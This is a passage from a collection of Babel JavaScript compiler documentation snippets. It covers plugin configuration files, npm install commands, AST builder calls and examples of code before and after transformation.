variance.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_128\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectTypeIndexer(id, key, value, variance);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in Configuration File - JSON\nDESCRIPTION: Configures the `@babel/plugin-transform-dotall-regex` plugin within a `.babelrc` or `babel.config.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dotall-regex.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-dotall-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Preset Env Loose Configuration JSON\nDESCRIPTION: This JSON configuration demonstrates the equivalent of `@babel/preset-env`'s `loose` option. It excludes the `transform-typeof-symbol` transform and enables various assumptions for optimization purposes. Assumptions like `arrayLikeIsIterable`, `constantReexports`, `ignoreFunctionLength`, etc. are enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_24\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-env\", { \"exclude\": [\"transform-typeof-symbol\"] }]\n  ],\n  \"assumptions\": {\n    \"arrayLikeIsIterable\": true,\n    \"constantReexports\": true,\n    \"ignoreFunctionLength\": true,\n    \"ignoreToPrimitiveHint\": true,\n    \"mutableTemplateObject\": true,\n    \"noClassCalls\": true,\n    \"noDocumentAll\": true,\n    \"objectRestNoSymbols\": true,\n    \"privateFieldsAsProperties\": true,\n    \"pureGetters\": true,\n    \"setClassMethods\": true,\n    \"setComputedProperties\": true,\n    \"setPublicClassFields\": true,\n    \"setSpreadProperties\": true,\n    \"skipForOfIteratorClosing\": true,\n    \"superIsCallableConstructor\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Annotate as Pure Usage JavaScript\nDESCRIPTION: Illustrates how to use `@babel/helper-annotate-as-pure` within a Babel plugin using `@babel/traverse`.  It imports the necessary modules and annotates `CallExpression` nodes as pure during traversal.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-annotate-as-pure.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport traverse from \"@babel/traverse\";\nimport annotateAsPure from \"@babel/helper-annotate-as-pure\";\n\n// ...\n\ntraverse(file, {\n  CallExpression(path) {\n    annotateAsPure(path);\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Checking for CompletionStatement Node Type with Babel\nDESCRIPTION: Checks if a given AST node is a `CompletionStatement` using `t.isCompletionStatement(node)`. This alias encompasses statements that define control flow, such as `BreakStatement`, `ContinueStatement`, `ReturnStatement`, and `ThrowStatement`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_258\n\nLANGUAGE: javascript\nCODE:\n```\nt.isCompletionStatement(node);\n```\n\n----------------------------------------\n\nTITLE: Using the Babel Plugin via Node API\nDESCRIPTION: This JavaScript snippet demonstrates how to use the @babel/plugin-bugfix-safari-class-field-initializer-scope via the Node API. It uses `require(\"@babel/core\").transformSync` to transform the `code` string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-class-field-initializer-scope.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-bugfix-safari-class-field-initializer-scope\"],\n});\n```\n\n----------------------------------------\n\nTITLE: RegExp Duplicate Named Capturing Groups\nDESCRIPTION: This JavaScript code demonstrates the usage of duplicate named capturing groups in regular expressions. The 'dateRE' regular expression allows re-using the 'year' and 'month' group names in different branches of the expression.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-09-05-7.19.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst dateRE = /(?<year>\\d\\d\\d\\d)-(?<month>\\d\\d)|(?<month>\\d\\d)-(?<year>\\d\\d)/;\n\nconsole.log(\"2022-12\".match(dateRE).groups); // { year: \"2022\", month: \"12\" }\nconsole.log(\"12-2022\".match(dateRE).groups); // { year: \"2022\", month: \"12\" }\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Preset using npm\nDESCRIPTION: This command installs the babel-preset-es2015 package as a development dependency using npm. This preset includes the necessary plugins to transpile ES2015 code. The `--save-dev` flag indicates that this package is only needed during development.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-29-6.0.0.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-preset-es2015\n```\n\n----------------------------------------\n\nTITLE: Handling ArrowFunctionExpression Body\nDESCRIPTION: This code snippet demonstrates how to determine if an `ArrowFunctionExpression` is an expression or a block statement.  The `expression` field was removed; now check the `body.type`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n  return {\n    visitor: {\n      ArrowFunctionExpression({ node }) {\n-       if (node.expression) {\n+       if (node.body.type !== \"BlockStatement\") {\n          // () => foo;\n        }\n      }\n    }\n  };\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin\nDESCRIPTION: This command installs the `@babel/plugin-transform-react-jsx-self` plugin as a development dependency using npm. This is a prerequisite to using the plugin in a Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-self.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-jsx-self\n```\n\n----------------------------------------\n\nTITLE: Example of plugin compatibility data\nDESCRIPTION: This JavaScript code snippet shows an example of the data structure returned when accessing the compatibility data for a specific Babel plugin (transform-object-rest-spread). The values represent the minimum supported versions of different browsers and runtimes.\nSOURCE: https://github.com/babel/website/blob/main/docs/compat-data.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n    \"chrome\": \"60\",\n    \"opera\": \"47\",\n    \"edge\": \"79\",\n    \"firefox\": \"55\",\n    \"safari\": \"11.1\",\n    \"node\": \"8.3\",\n    \"deno\": \"1\",\n    \"ios\": \"11.3\",\n    \"samsung\": \"8\",\n    \"opera_mobile\": \"44\",\n    \"electron\": \"2.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed named capturing groups regex output in JavaScript\nDESCRIPTION: This shows the output JavaScript code after the Babel plugin transforms the regular expression. The regex is wrapped with `_wrapRegExp` to provide support for named capturing groups.  The example also includes accessing the named group.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar re = _wrapRegExp(/(\\d{4})-(\\d{2})-(\\d{2})/, { year: 1, month: 2, day: 3 });\n\nconsole.log(re.exec(\"1999-02-29\").groups.year);\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json JSON\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-syntax-async-generators` plugin within a `babel.config.json` file. This method is recommended for project-wide configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-generators.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-async-generators\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Import Attributes Usage (JavaScript)\nDESCRIPTION: Shows how to use Import Attributes with the `with` keyword to specify the type of the imported resource. This example demonstrates importing a JSON file.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport json from \"./foo.json\" with { type: \"json\" };\n\nimport(\"./foo.json\", { with: { type: \"json\" } });\n```\n\n----------------------------------------\n\nTITLE: Installing @ava/babel with npm\nDESCRIPTION: This command installs the `@ava/babel` package as a development dependency using npm. The `--save-dev` flag ensures that the package is added to the `devDependencies` section of the `package.json` file. This package is likely used for testing Babel-related code with AVA.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/ava/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @ava/babel\n```\n\n----------------------------------------\n\nTITLE: Babel Helper Function Example\nDESCRIPTION: This JavaScript code shows the output after compiling the `Person` class, including the `_classCallCheck` helper function. This helper ensures that the class is called with `new`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } }\n\nvar Person = function Person() {\n  _classCallCheck(this, Person);\n};\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypePredicate Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypePredicate` AST node using Babel's `t.tsTypePredicate` method. It requires a parameter name (`Identifier | TSThisType`), an optional `TSTypeAnnotation`, and an optional boolean `asserts` value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_218\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypePredicate(parameterName, typeAnnotation, asserts);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for `declare` Class Fields\nDESCRIPTION: This JSON configuration shows how to enable the `allowDeclareFields` option in `@babel/preset-typescript` to support the `declare` keyword in class fields.  Setting `allowDeclareFields` to `true` allows Babel to correctly transform TypeScript code that uses the `declare` keyword for class fields.  Requires `@babel/preset-typescript` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_5\n\nLANGUAGE: jsonld\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-typescript\", {\n      \"allowDeclareFields\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin via babel.config.json\nDESCRIPTION: Example of configuring the @babel/plugin-transform-object-rest-spread plugin within a babel.config.json file by adding it to the plugins array. This is the recommended configuration method.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-object-rest-spread\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeParameterDeclaration with Babel\nDESCRIPTION: Creates a `TypeParameterDeclaration` AST node using the `t.typeParameterDeclaration` method. This node represents a type parameter declaration in Flow, where `params` is an array of `TypeParameter` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_239\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeParameterDeclaration(params);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Command to install the `@babel/plugin-proposal-export-default-from` plugin as a development dependency using npm. The `npm2yarn` snippet indicates that this command can be converted to yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-export-default-from.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-export-default-from\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Output Code\nDESCRIPTION: This example shows the output JavaScript code after the plugin has added 'use strict' to the beginning of the file. It demonstrates how the plugin enforces strict mode.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-strict-mode.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nfoo();\n```\n\n----------------------------------------\n\nTITLE: ES Module Example\nDESCRIPTION: This is an example of an ECMAScript module exporting a default value.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default 42;\n```\n\n----------------------------------------\n\nTITLE: Creating a TSInstantiationExpression Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSInstantiationExpression` AST node using `t.tsInstantiationExpression`. It requires an expression, and optionally accepts `typeParameters` for generic type instantiation. This node represents a TypeScript instantiation expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_181\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsInstantiationExpression(expression, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Assumptions\nDESCRIPTION: Example of a Babel configuration using the top-level `assumptions` option.  This allows Babel to make certain assumptions about the code being compiled, potentially resulting in smaller or faster output. It needs \"@babel/preset-env\" to be installed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"targets\": \"firefox 30\",\n  \"assumptions\": { \"noClassCalls\": true },\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed WASM Import (Browsers)\nDESCRIPTION: This JavaScript code shows the transformed output for browsers, using `WebAssembly.compileStreaming` and `fetch` to load and compile the WASM module.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst libMod = await WebAssembly.compileStreaming(fetch(import.meta.resolve(\"./lib.wasm\")));\n```\n\n----------------------------------------\n\nTITLE: Configure setPublicClassFields Assumption in babel.config.json\nDESCRIPTION: Example showing how to configure the `setPublicClassFields` assumption in `babel.config.json`. When enabled, class properties are compiled using assignment expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"setPublicClassFields\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Declaration Syntax - JavaScript\nDESCRIPTION: This example demonstrates the 'using' and 'await using' syntax that this plugin enables Babel to parse. It shows how to declare resources that will be automatically disposed of when they are no longer needed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-explicit-resource-management.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nusing handler = await read();\nawait using handler = await read();\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/compat-data with npm or yarn\nDESCRIPTION: This command installs the @babel/compat-data package as a development dependency using either npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/compat-data.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/compat-data\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage (JSON)\nDESCRIPTION: This JSON snippet shows how to configure the Babel plugin in a `babel.config.json` file.  The plugin is added to the `plugins` array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-duplicate-named-capturing-groups-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure JSX Transformation with Babel Helper\nDESCRIPTION: This JavaScript code snippet demonstrates how to configure the `@babel/helper-builder-react-jsx` to customize JSX transformation. It defines the shape of the ElementState type and shows how to use the `filter`, `pre`, `post`, and `compat` options to control the transformation process. The `filter` function determines whether an element is transformed. The `pre` function is called before building attributes, and the `post` function is called after building attributes. The `compat` option enables React compatibility mode.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-builder-react-jsx.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntype ElementState = {\n  tagExpr: Object; // tag node\n  tagName: string; // raw string tag name\n  args: Array<Object>; // array of call arguments\n  call?: Object; // optional call property that can be set to override the call expression returned\n};\n\nrequire(\"@babel/helper-builder-react-jsx\")({\n  filter: function (element: JSXElement) {\n    // if returns false, the element isn't transformed\n  },\n\n  pre: function (state: ElementState) {\n    // function called with (state: ElementState) before building attribs\n  },\n\n  post: function (state: ElementState) {\n    // function called with (state: ElementState) after building attribs\n  },\n\n  compat?: boolean // true if React is in compat mode\n});\n```\n\n----------------------------------------\n\nTITLE: Configuration: Use Babel Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin in the `babel.config.json` file. This is the recommended way to use the plugin.  The plugin is added to the `plugins` array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-member-expression-literals.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-member-expression-literals\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Plugin Usage via Node API\nDESCRIPTION: This snippet shows how to use the plugin programmatically via the Babel Node API. It transforms the provided code string using the specified plugin and returns the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-comments.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-flow-comments\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Member Expression in JavaScript\nDESCRIPTION: This snippet creates a `JSXMemberExpression` AST node using Babel's `t.jsxMemberExpression` builder. The `object` parameter is a `JSXMemberExpression` or `JSXIdentifier`, and the `property` parameter is a `JSXIdentifier`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_101\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxMemberExpression(object, property);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the `@babel/plugin-syntax-destructuring-private` plugin within a `babel.config.json` file. This enables the plugin for all Babel transformations applied within the project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-destructuring-private.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-destructuring-private\"]\n}\n```\n\n----------------------------------------\n\nTITLE: React JSX Output Example (JavaScript)\nDESCRIPTION: This code snippet demonstrates the transformed React code. The JSX syntax is converted into `React.DOM` calls, making it compatible with older versions of React.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-compat.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar profile = React.DOM.div(\n  null,\n  React.DOM.img({ src: \"avatar.png\", class: \"profile\" }),\n  React.DOM.h3(null, [user.firstName, user.lastName].join(\" \"))\n);\n```\n\n----------------------------------------\n\nTITLE: Type Definition for EmitFunction\nDESCRIPTION: TypeScript type definition for the EmitFunction, which is used as a callback in the hoistVariables function.  It emits binding identifiers.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-hoist-variables.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\ntype EmitFunction = (\n  id: t.Identifier,\n  idName: string,\n  hasInit: boolean,\n) => any;\n```\n\n----------------------------------------\n\nTITLE: Disallowed Decorator Usage JavaScript\nDESCRIPTION: This code demonstrates disallowed decorator usage scenarios in JavaScript. These include computed decorator keys, parameter decorators, decorators on object methods, and decorators attached to exports.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\n// no computed decorator keys\n@dec[foo]\nclass A {}\n\n// no parameter decorators (a separate proposal)\nclass Foo {\n  constructor(@foo x) {}\n}\n\n// no decorators on object methods\nvar o = {\n  @baz\n  foo() {}\n}\n\n// decorator cannot be attached to the export\n@foo\nexport default class {}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Demonstrates how to use the @babel/plugin-syntax-import-source plugin programmatically via the Node API.  It transforms the input 'code' string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-source.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-import-source\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Function Wrapping Example - Input JavaScript\nDESCRIPTION: This example shows the JavaScript code before the @babel/helper-wrap-function helper is applied.  It represents a simple Immediately Invoked Function Expression (IIFE).\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-wrap-function.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n(function () {\n}());\n```\n\n----------------------------------------\n\nTITLE: Flow Type Annotations Example (Input)\nDESCRIPTION: This example demonstrates how Flow type annotations are written in the input JavaScript code. These annotations will be transformed into comments by the Babel plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-comments.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo(bar?) {}\nfunction foo2(bar?: string) {}\nfunction foo(x: number): string {}\ntype B = {\n  name: string,\n};\nexport type GraphQLFormattedError = number;\nimport type A, { B, C } from \"./types\";\nimport typeof D, { E, F } from \"./types\";\n```\n\n----------------------------------------\n\nTITLE: Decorators Before Export - JavaScript\nDESCRIPTION: This code snippet demonstrates how the `decoratorsBeforeExport` option affects the placement of decorators in relation to the `export` keyword. When set to `true`, decorators must precede the `export` keyword. When set to `false`, decorators must follow the `export` keyword.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_37\n\nLANGUAGE: JavaScript\nCODE:\n```\n// decoratorsBeforeExport: true\n@dec\nexport class C {}\n\n// decoratorsBeforeExport: false\nexport @dec class C {}\n```\n\n----------------------------------------\n\nTITLE: Regex Example JavaScript\nDESCRIPTION: This example demonstrates a regular expression using the 'v' flag, which is enabled by the plugin.  It matches characters that are both ASCII and decimal numbers.  This snippet showcases the syntax enabled by the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-unicode-sets-regex.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n/[\\p{ASCII}&&\\p{Decimal_Number}]/v\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage - JSON\nDESCRIPTION: This snippet shows how to configure the @babel/plugin-proposal-destructuring-private plugin using a babel.config.json file. It includes the plugin in the plugins array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-destructuring-private.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-destructuring-private\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Parenthesized Type\nDESCRIPTION: Creates a TypeScript parenthesized type node in the AST. Represents a type enclosed in parentheses. This is often used to control precedence or improve readability. Requires the type annotation to be parenthesized.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_200\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsParenthesizedType(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Installing React.MSBuild via NuGet in ASP.NET 4.x\nDESCRIPTION: This command installs the React.MSBuild NuGet package, which provides MSBuild tasks for using Babel with ReactJS.NET in an ASP.NET 4.x project.  It configures the build process to automatically transpile JavaScript files using Babel. This requires NuGet package manager to be installed.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/msbuild/install.md#_snippet_0\n\nLANGUAGE: PowerShell\nCODE:\n```\nInstall-Package React.MSBuild\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread Old Behavior (JavaScript)\nDESCRIPTION: This snippet shows the old Babel 6 behavior for object rest spread when the `loose` option is enabled, using the `_extends` helper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\n// Old v6 behavior: [\"proposal-object-rest-spread\", { \"loose\": true }]\nfunction _extends(target) { ... }\n\nz = _extends({\n  x\n}, y);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin in Brunch (CoffeeScript)\nDESCRIPTION: This code snippet demonstrates how to configure the Babel plugin within a Brunch project's `brunch-config.coffee` file. It showcases setting plugin-specific options, such as whitelisting specific Babel features (e.g., `arrowFunctions`) and customizing the output format (e.g., disabling semicolons). The `filename` and `sourceMap` options are explicitly excluded from user configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/brunch/usage.md#_snippet_0\n\nLANGUAGE: coffeescript\nCODE:\n```\nplugins:\n  babel:\n    whitelist: [\"arrowFunctions\"]\n    format:\n      semicolons: false\n```\n\n----------------------------------------\n\nTITLE: Plugin Configuration JSON\nDESCRIPTION: Configures Babel to use the `@babel/plugin-transform-class-static-block` plugin by including it in the `plugins` array in `babel.config.json`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-class-static-block\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a NumericLiteral in JavaScript\nDESCRIPTION: This code snippet demonstrates creating a `NumericLiteral` AST node using `t.numericLiteral(value)`. The `value` parameter represents the numeric value of the literal and must be a non-negative finite number. This node is a basic expression representing a numeric value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_121\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.numericLiteral(value);\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with TypeScript Preset JSON\nDESCRIPTION: This demonstrates how to configure Babel to use the TypeScript preset. This setup allows Babel to strip TypeScript types, similar to how it handles Flow types. Requires `--noEmit` when using tsc.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_20\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"typescript\"]\n}\n```\n\n----------------------------------------\n\nTITLE: t.isNodesEquivalent Usage (JavaScript)\nDESCRIPTION: Demonstrates how to use `t.isNodesEquivalent` to check if two AST nodes are semantically equivalent. It uses `parse` to create AST nodes from strings and then compares them.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nassert(t.isNodesEquivalent(parse(\"1 + 1\"), parse(\"1+1\")) === true);\n```\n\n----------------------------------------\n\nTITLE: TSConstructorType AST (Babel 7)\nDESCRIPTION: Babel 7 AST for TSConstructorType, using `parameters` and `typeAnnotation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_24\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSConstructorType\",\n  \"parameters\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"typeAnnotation\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Source Phase Import Example in JavaScript\nDESCRIPTION: This code demonstrates importing a WebAssembly module source using the `import source` syntax. It requires the `@babel/plugin-proposal-import-wasm-source` plugin, and babel needs to be configured with appropriate `targets` to indicate whether to target Node.js or web-compatible environments.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// Before\nconst url = import.meta.resolve(\"./my-wasm/module.wasm\");\nconst responsePromise = fetch(url);\nconst mod = await WebAssembly.compileStreaming(responsePromise);\n\n// After\nimport source mod from \"./my-wasm/module.wasm\";\n```\n\n----------------------------------------\n\nTITLE: Transpiling ES6 with Babel in Pug\nDESCRIPTION: This snippet demonstrates how to use the `:babel` filter within a Pug template to transpile ES6 code. The code defines a simple ES6 class `Person` and instantiates it. The `jstransformers/jstransformer-babel` package is required for this functionality.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/pug/usage.md#_snippet_0\n\nLANGUAGE: pug\nCODE:\n```\nscript\n  :babel\n    console.log(\"Hello World !!!\");\n    class Person {\n      constructor(name) {\n        this.name = name;\n      }\n      sayName(){\n        console.log(`Hello, my name is ${this.name}`);\n      }\n    }\n    var person = new Person(\"Apoxx\");\n    person.sayName();\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin\nDESCRIPTION: Command line instruction to install the plugin using npm.  This is a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-proto-to-assign\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: Runs Babel from the command line, specifying the `@babel/plugin-syntax-function-sent` plugin.  This allows for on-demand transpilation of individual files using the specified plugin. Requires `@babel/cli` to be installed globally or locally.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-sent.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-function-sent script.js\n```\n\n----------------------------------------\n\nTITLE: Adding EmptyTypeAnnotation in JavaScript\nDESCRIPTION: This code snippet demonstrates the use of `EmptyTypeAnnotation` for type definitions in Flow.  It shows a function that accepts an `empty` type as an argument, illustrating its usage.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction f<T>(x: empty): T {\n  return x;\n}\nf(); // nothing to pass...\n```\n\n----------------------------------------\n\nTITLE: Creating a ThisTypeAnnotation Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `ThisTypeAnnotation` AST node using Babel's `t.thisTypeAnnotation` method. This method does not accept any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_229\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.thisTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Using @babel/eslint-parser Experimental Worker in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the experimental worker entry point of `@babel/eslint-parser`. It shows how to configure ESLint to use the worker-based parser for handling Babel configuration loading and parsing, especially when dealing with asynchronous configuration loading. This is useful for projects using native ECMAScript modules for Babel configuration files.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-07-26-7.15.0.md#_snippet_5\n\nLANGUAGE: 